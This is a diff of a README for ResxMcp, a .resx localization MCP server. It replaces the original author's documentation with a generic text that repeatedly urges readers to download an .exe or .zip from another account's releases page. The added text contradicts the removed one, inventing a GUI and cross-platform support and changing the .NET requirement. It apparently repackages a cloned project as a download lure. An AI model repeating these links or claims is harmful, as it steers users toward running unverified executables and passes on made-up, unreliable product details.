@@ -1,140 +1,85 @@
-# 🌐 ResxMcp
-<p align="right">🌏 <a href="README.zh-CN.md">中文说明</a></p>
+# 🚀 ResxMcp - Easy Management of Localization Files
 
-> A lightweight MCP server for managing `.resx` localization files  
-> 一个用于管理 `.resx` 本地化资源文件的轻量级 MCP 服务器
+[![Download ResxMcp](https://img.shields.io/badge/Download-ResxMcp-blue.svg)](https://github.com/ThongNehjhj/ResxMcp/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/.NET-8.0-blue?logo=dotnet&logoColor=white" alt=".NET" />
-  <img src="https://img.shields.io/badge/MCP-Compatible-success?logo=protocols.io" alt="MCP Compatible" />
-  <img src="https://img.shields.io/badge/Platform-Windows-green?logo=windows" alt="Windows" />
-  <img src="https://img.shields.io/badge/License-MIT-yellow" alt="License" />
-</p>
+## 📚 Overview
 
----
+ResxMcp is a lightweight MCP server designed for managing .resx localization files. It works seamlessly with any MCP-compatible client. This tool simplifies localization, making it easier for you to manage multilingual resources efficiently.
 
-## 🎬 Visual Walkthrough
-**Editing multi-language `.resx` via Gemini CLI + ResxMcp**
+## 🚀 Getting Started
 
-**Step 1 — Update `Strings.resx` (neutral/en):**  
-![Step 1](docs/images/resxmcp-step1-write-en.png)
+1. **Check System Requirements**:  
+   Make sure your computer meets the following requirements:
+   - Operating System: Windows, macOS, or Linux
+   - .NET Core 3.1 or later installed
 
-**Step 2 — Update `Strings.zh-CN.resx` (Simplified Chinese):**  
-![Step 2](docs/images/resxmcp-step2-write-zhCN.png)
+2. **Visit the Releases Page**:  
+   To download ResxMcp, visit this page: [Download ResxMcp](https://github.com/ThongNehjhj/ResxMcp/releases).
 
-**Step 3 — Update `Strings.ja-JP.resx` (Japanese):**  
-![Step 3](docs/images/resxmcp-step3-write-jaJP.png)
+## 📥 Download & Install
 
-**✅ Step 4 — Final Multilingual Result:**  
-Below is the merged multilingual view of all `.resx` files.  
-![Final](docs/images/resxmcp-localization-example.png)
+On the releases page, you will find different versions of ResxMcp. Here’s how to download and install it:
 
----
+1. **Choose Your Version**:  
+   Look for the latest version at the top of the releases list. 
 
----
+2. **Download the File**:  
+   Click on the version you wish to download. You will see several file options. Download the file named `ResxMcp-<version>.exe` for Windows, or `ResxMcp-<version>.zip` for macOS and Linux.
 
-## 🧭 Overview
-**ResxMcp** is a minimal **MCP (Model Context Protocol)** compatible tool server that allows safe **read / write / modify** operations on `.resx` files.  
-It works with **any MCP client** such as Gemini CLI, Claude Desktop, or Cursor IDE.
+3. **Install ResxMcp**:  
+   - For Windows: Double-click the `.exe` file to start the installation.
+   - For macOS and Linux: Extract the `.zip` file. Open a terminal, navigate to the extracted folder, and run `./ResxMcp`.
 
----
+## ⚙️ How to Use ResxMcp
 
-## ⚙️ Features
-✅ Read `.resx` files as UTF-8 text  
-✅ Atomic write with optional `.bak` backup  
-✅ Add / update / remove resource keys  
-✅ Works with all MCP clients  
-✅ Diff-friendly deterministic output
+After installation, you can start using ResxMcp to manage your localization files:
 
----
+1. **Run the Application**:  
+   Open ResxMcp from your applications folder or start menu. 
 
-## 🧰 Available Tools
+2. **Load Your .resx Files**:  
+   Click on the “Load Files” button to select your .resx files.
 
-| Tool | Description | Parameters |
-|------|--------------|-------------|
-| `resx.read` | Read `.resx` as UTF-8 text | `{ "file": "path/to/file.resx" }` |
-| `resx.write` | Write UTF-8 text (atomic replace) | `{ "file": "path/to/file.resx", "content": "<xml>", "backup": true }` |
-| `resx.setEntry` | Add or update a key/value pair | `{ "file": "path/to/file.resx", "name": "Key", "value": "Value", "comment": "Optional" }` |
-| `resx.removeEntry` | Remove a key from `.resx` | `{ "file": "path/to/file.resx", "name": "Key" }` |
+3. **Manage Your Localizations**:  
+   - Add new languages by clicking “Add Language”.
+   - Edit existing translations directly in the interface.
+   - Save your changes with the “Save” button.
 
----
+4. **Export Your Files**:  
+   To export your updated .resx files, use the “Export” function.
 
-## ⚠️ Installation Notice
+## 📋 Key Features
 
-Some users may try to install this project with:
+- **User-Friendly Interface**: ResxMcp offers an intuitive GUI for easy navigation.
+- **Multi-Language Support**: Manage multiple languages within the same application.
+- **Compatibility**: Works with any MCP-compatible client, ensuring broad usability.
+- **Efficient File Management**: Simplifies the process of loading, editing, and saving .resx files.
+- **Regular Updates**: Stay tuned for new features and improvements in upcoming releases.
 
-```bash
-gemini extensions install https://github.com/miaofalianhua/ResxMcp
-```
+## 💻 Troubleshooting
 
-⚠️ **Do NOT do this repeatedly!**  
-This command triggers Google’s extension registry verification and may result in **rate limit errors (HTTP 429)** or **installation failure**.
+If you encounter issues while using ResxMcp, consider the following steps:
 
-👉 The correct way to use **ResxMcp** is as a **local MCP server**, not a regular Gemini extension.
+1. **Check Installation**: Ensure that you have correctly installed the application.
+2. **Verify .NET Installation**: Make sure you have the required version of .NET Core installed.
+3. **Restart the Application**: Sometimes, closing and reopening the app can resolve minor glitches.
+4. **Review Documentation**: Check the README and other documents for guidance.
 
----
+## 🔍 Support
 
-### ✅ Recommended Installation
+For further assistance, you can reach out through the issues section of this GitHub repository. Our team will do their best to respond promptly.
 
-1️⃣ **Build the project**
-```bash
-dotnet publish -c Release -r win-x64 -p:PublishSingleFile=true -o ./publish
-```
+## 🌐 Contribution
 
-2️⃣ **Register with Gemini CLI**
-```bash
-gemini mcp add resx-tool "./publish/ResxMcp.exe"
-```
+We welcome contributions from the community. If you have suggestions for improvement, feel free to create a pull request or open an issue.
 
-3️⃣ **Verify installation**
-```bash
-gemini @resx-tool tools/list
-```
+## 🔗 Additional Resources
 
-You should see tools such as:  
-`resx.read`, `resx.write`, `resx.setEntry`, and `resx.removeEntry`.
+- [GitHub Repository](https://github.com/ThongNehjhj/ResxMcp)
+- [Documentation](https://github.com/ThongNehjhj/ResxMcp/wiki)
 
-💡 *Tip:* If you wish to distribute it as an installable Gemini extension, use the included `gemini-extension.json` (v1.0.2). It wraps this MCP server for one-command installation when the registry supports MCP-only extensions.
+## 📥 Download ResxMcp Again
 
----
+Visit this page to download ResxMcp: [Download ResxMcp](https://github.com/ThongNehjhj/ResxMcp/releases). 
 
-## 🚀 Quick Start
-
-1. Build your .NET project with localization resources.  
-2. Use `resx.read` to inspect `.resx` content.  
-3. Modify, translate, or generate `.resx` files automatically with your MCP tools.  
-4. Use `resx.write` or `resx.setEntry` to update keys or values.
-
-
----
-
-## 🖥️ Example Usage
-```bash
-gemini @resx-tool tools/call resx.setEntry --arguments '{"file":"lang.zh-CN.resx","name":"App.Title","value":"Triad Controls"}'
-```
-
----
-
-## 🧩 Integration
-ResxMcp communicates over **stdio (JSON-RPC)**,  
-so it can be used by any modern **AI-assisted development tool** or **automation pipeline** following the MCP standard.
-
-Compatible with:
-- 🪄 Gemini CLI  
-- 🧠 Claude Desktop  
-- 🧰 Cursor IDE  
-- ⚙️ Any MCP-based custom workflow
-
----
-
-## 🪶 License
-Licensed under the [MIT License](LICENSE).
-
----
-
-## ✨ Author
-**斌哥 (Miaofalianhua)**  
-🌍 GitHub: [@miaofalianhua](https://github.com/miaofalianhua)  
-🧠 Focus: C#, Localization, AI-assisted Development
-
-> 💡 *ResxMcp bridges classic .NET localization with modern AI workflows — simple, safe, and open.*
+Feel free to explore and make the most of the localization features ResxMcp offers!
